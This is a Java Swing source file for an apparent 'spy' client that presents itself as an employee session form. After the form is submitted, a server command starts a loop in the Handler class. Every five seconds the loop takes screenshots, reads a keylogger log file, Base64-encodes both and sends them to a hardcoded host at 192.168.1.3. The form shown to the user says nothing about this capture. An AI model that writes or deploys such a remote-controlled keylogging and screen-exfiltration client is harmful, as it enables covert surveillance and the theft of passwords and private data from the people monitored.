/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package spy.user;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import java.util.Date;
import javax.swing.JOptionPane;
import org.json.simple.JSONObject;

/**
 *
 * @author root
 */
public class Home extends javax.swing.JFrame {
//    Database db;
    Monitor mon;
    /**
     * Creates new form Home
     */
    public Home() {
        initComponents();
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        jPanel2 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jLabel2 = new javax.swing.JLabel();
        name = new javax.swing.JTextField();
        jLabel3 = new javax.swing.JLabel();
        empid = new javax.swing.JTextField();
        jLabel4 = new javax.swing.JLabel();
        pcno = new javax.swing.JTextField();
        jLabel8 = new javax.swing.JLabel();
        dept = new javax.swing.JComboBox<>();
        jButton2 = new javax.swing.JButton();
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu1 = new javax.swing.JMenu();
        jMenuItem1 = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Start your session");
        setResizable(false);

        jPanel1.setLayout(new java.awt.CardLayout());

        jLabel1.setFont(new java.awt.Font("Ubuntu", 1, 18)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(75, 108, 190));
        jLabel1.setText("Enter below details to start your session:");

        jLabel2.setText("Client name:");

        name.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                nameActionPerformed(evt);
            }
        });

        jLabel3.setText("Emp ID:");

        jLabel4.setText("PC Number:");

        jLabel8.setText("Department");

        dept.setModel(new javax.swing.DefaultComboBoxModel<>(new String[] { "HR", "Development", "Management", "Support", "QA" }));

        jButton2.setBackground(new java.awt.Color(20, 186, 93));
        jButton2.setFont(new java.awt.Font("Ubuntu", 1, 24)); // NOI18N
        jButton2.setForeground(new java.awt.Color(255, 255, 255));
        jButton2.setText("Start Session");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(211, 211, 211)
                        .addComponent(jLabel1))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(190, 190, 190)
                        .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(jPanel2Layout.createSequentialGroup()
                                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jLabel2)
                                    .addComponent(name, javax.swing.GroupLayout.PREFERRED_SIZE, 210, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addGap(18, 18, 18)
                                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(pcno, javax.swing.GroupLayout.PREFERRED_SIZE, 210, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(jLabel4)))
                            .addGroup(jPanel2Layout.createSequentialGroup()
                                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jLabel3)
                                    .addComponent(empid, javax.swing.GroupLayout.PREFERRED_SIZE, 210, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addGap(18, 18, 18)
                                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(dept, javax.swing.GroupLayout.PREFERRED_SIZE, 200, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(jLabel8)))))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(320, 320, 320)
                        .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 189, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(209, Short.MAX_VALUE))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 21, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(24, 24, 24)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel2Layout.createSequentialGroup()
                        .addComponent(jLabel4)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(pcno, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel2Layout.createSequentialGroup()
                        .addComponent(jLabel2)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(name, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addGap(23, 23, 23)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel3)
                    .addComponent(jLabel8))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(empid, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(dept, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(35, 35, 35)
                .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 50, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(196, Short.MAX_VALUE))
        );

        jPanel1.add(jPanel2, "card2");

        jMenu1.setText("File");

        jMenuItem1.setText("Exit");
        jMenuItem1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem1ActionPerformed(evt);
            }
        });
        jMenu1.add(jMenuItem1);

        jMenuBar1.add(jMenu1);

        setJMenuBar(jMenuBar1);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents
    public static String encodeImage(byte[] imageByteArray) {
        return Base64.getEncoder().encodeToString(imageByteArray);
    }
    
    public static byte[] decodeImage(String imageDataString) {
        return Base64.getDecoder().decode(imageDataString);
    }
    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed
        // TODO add your handling code here:
        
        
        String unm=name.getText();
        String pcn=pcno.getText();
        String empd=empid.getText();
        String deptd=dept.getSelectedItem().toString();
        
        if(unm.equals("") || pcn.equals("") || empd.equals("") || deptd.equals("")){
            JOptionPane.showMessageDialog(null,"Please fill all the fields.","Alert",JOptionPane.INFORMATION_MESSAGE);
        }else{
            
            try
            {
                System.out.println(InetAddress.getByName("192.168.1.3"));
                Socket s = new Socket(InetAddress.getByName("192.168.1.3"), 6789);
                BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));
                
                DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");  
                LocalDateTime now = LocalDateTime.now();  
                String dt=dtf.format(now); 
                
                PrintWriter w = new PrintWriter(s.getOutputStream(), true);
                String[] strAr3= new String[5]; //Initialization after declaration with specific size  
                strAr3[0]= unm;  
                strAr3[1]= pcn;  
                strAr3[2]= empd;
                strAr3[3]= deptd;
                strAr3[4]= dt;
                
                       
                System.out.println("init");
                
                jPanel1.removeAll();
                jPanel1.repaint();
                jPanel1.revalidate();
                mon=new Monitor(strAr3);
                jPanel1.add(mon);
                jPanel1.repaint();
                jPanel1.revalidate();
                
                new Handler(r,w,strAr3);
//                NewThread t = new NewThread();
//                t.start();
                
            }
            catch (Exception err)
            {
                System.err.println("exc "+err);
            }
        }
        
    }//GEN-LAST:event_jButton2ActionPerformed
    
    class Handler implements Runnable {
        //create byte array
        BufferedReader r; String line;
        String[] str;
        PrintWriter pr;
        Runtime runtime; Process process;
        Handler (BufferedReader s,PrintWriter pr,String str[]){
            this.r=s;
            this.pr=pr;
            this.str=str;
            new Thread(this).start();
            System.out.println("Thread created.");
        }

        public void run(){
            try{

                while(true)
                {
                    line = r.readLine();
                    System.out.println(line);
                    //if ( line != null )
                    
                    if(line.contains("src")){
                        String ipaddr="192.168.1.3";
                        CaptureScreen cs = new CaptureScreen();
                        int count = 1;
                        while (true) {
                            KeyLogger kg=new KeyLogger();
                            SimpleDateFormat dttm=new SimpleDateFormat("dd-mm-yyyy-HH-mm-ss");
                            File fl= cs.saveScreenshot("screen_"+dttm.format(new Date())+".jpg",ipaddr,mon.getID());
                            try {
                                File logfile=new File("C:/Users/Akshay Bahadarpure/Documents/NetBeansProjects/New folder/spy-user/src/log/keylog.txt");
                                if (fl.isFile()) {
                                        FileInputStream imageInFile = new FileInputStream(fl);
                                        byte imageData[] = new byte[(int) fl.length()];
                                        imageInFile.read(imageData);
                                        //Image conversion byte array in Base64 String
                                        String imageDataString = encodeImage(imageData);
                                        imageInFile.close();
                                        
                                        FileInputStream logInFile = new FileInputStream(logfile);
                                        byte logData[] = new byte[(int) logfile.length()];
                                        logInFile.read(logData);
                                        String fileDataString = encodeImage(logData);
                                        logInFile.close();
                                        //the object that will be send to Server
                                        JSONObject obj = new JSONObject();
                                        //name of the image
                                        obj.put("filename",fl.getName());
                                        obj.put("studid",mon.getID());
                                        //string obteined by the conversion of the image
                                        obj.put("image", imageDataString);
                                        obj.put("logfilename",logfile.getName());
                                        obj.put("logfile", fileDataString);
                                        pr.println(obj.toString());
                                        System.out.println(str[0]);
                                }
                            }
                            catch(Exception e){
                                System.out.println("e: "+e);
                            }
                            count++;
                            try {
                                Thread.sleep(5000);
                            } catch (InterruptedException e) {
                                System.out.println("e: "+e);
                                e.printStackTrace();
                            }
                        }
                    }else if(line.contains("clientdata")){
                        System.out.println("From Server: "+line);

                                JSONObject obj = new JSONObject();
                                //name of the image
                                obj.put("name",str[0]);
                                obj.put("pcno",str[1]);
                                obj.put("dept",str[3]);
                                obj.put("empid",str[2]);
                                obj.put("dt",str[4]);
                                pr.println(obj.toString());
                                System.out.println(str[0]);
                        
                    }
                        pr.flush();
                    
                }
            }
            catch(Exception ex) {System.out.println("exception "+ex.toString());}
        }
    }
    
//    public class NewThread extends Thread {
//        public void run() {
//            long startTime = System.currentTimeMillis();
//            int i = 0;
//            while (true) {
//                System.out.println(this.getName() + ": New Thread is running..." + i++);
//                
//                 String ipaddr="192.168.43.255";
//                    CaptureScreen cs = new CaptureScreen();
//                    SimpleDateFormat dttm=new SimpleDateFormat("dd-mm-yyyy-HH-mm-ss");
//                    File fl= cs.saveScreenshot("screen_"+dttm.format(new Date())+".jpg",ipaddr,mon.getID());
//                    try {
//                        if (fl.isFile()) {
//                                FileInputStream imageInFile = new FileInputStream(fl);
//                                byte imageData[] = new byte[(int) fl.length()];
//                                imageInFile.read(imageData);
//                                //Image conversion byte array in Base64 String
//                                String imageDataString = encodeImage(imageData);
//                                imageInFile.close();
//                                //the object that will be send to Server
//                                JSONObject obj = new JSONObject();
//                                //name of the image
//                                obj.put("filename",fl.getName());
//                                obj.put("studid",mon.getID());
//                                //string obteined by the conversion of the image
//                                obj.put("image", imageDataString);
//                        }
//                    }
//                    catch(Exception e){
//                        
//                    }
//                
//                try {
//                    //Wait for one sec so it doesn't print too fast
//                    Thread.sleep(1000);
//                } catch (InterruptedException e) {
//                    e.printStackTrace();
//                }
//            }
//        }
//    }
    
    private void jMenuItem1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem1ActionPerformed
        // TODO add your handling code here:
//        String stuid=mon.getID();

        this.dispose();
        System.exit(0);
    }//GEN-LAST:event_jMenuItem1ActionPerformed

    private void nameActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_nameActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_nameActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Home().setVisible(true);
            }
        });
    }

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JComboBox<String> dept;
    private javax.swing.JTextField empid;
    private javax.swing.JButton jButton2;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel8;
    private javax.swing.JMenu jMenu1;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JMenuItem jMenuItem1;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JTextField name;
    private javax.swing.JTextField pcno;
    // End of variables declaration//GEN-END:variables
}
